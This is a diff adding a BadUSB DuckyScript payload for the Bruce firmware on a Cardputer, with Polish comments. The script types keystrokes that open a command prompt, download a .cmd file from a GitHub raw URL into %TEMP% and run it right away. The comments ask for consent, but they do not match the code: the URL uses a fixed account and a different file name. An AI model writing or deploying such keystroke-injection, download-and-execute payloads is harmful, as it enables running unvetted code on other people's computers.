@@ -1,0 +1,12 @@
+REM TECHNO ZUL - BadUSB Cardputer Bruce - wariant przez GitHub
+REM Zmien TWOJ_LOGIN na swoj login GitHub i wgraj techno_zul_ascii.cmd
+REM do publicznego repozytorium techno-zul, w galezi main.
+REM Uruchamiaj wylacznie na swoim komputerze lub za zgoda wlasciciela.
+DELAY 1600
+GUI r
+DELAY 700
+STRING wt.exe -F cmd.exe
+ENTER
+DELAY 1200
+STRING curl.exe -fL --retry 2 -o "%TEMP%\brek_ascii.cmd" "https://raw.githubusercontent.com/Guzior1/techno-zul/main/brek_ascii.cmd" && call "%TEMP%\brek_ascii.cmd"
+ENTER
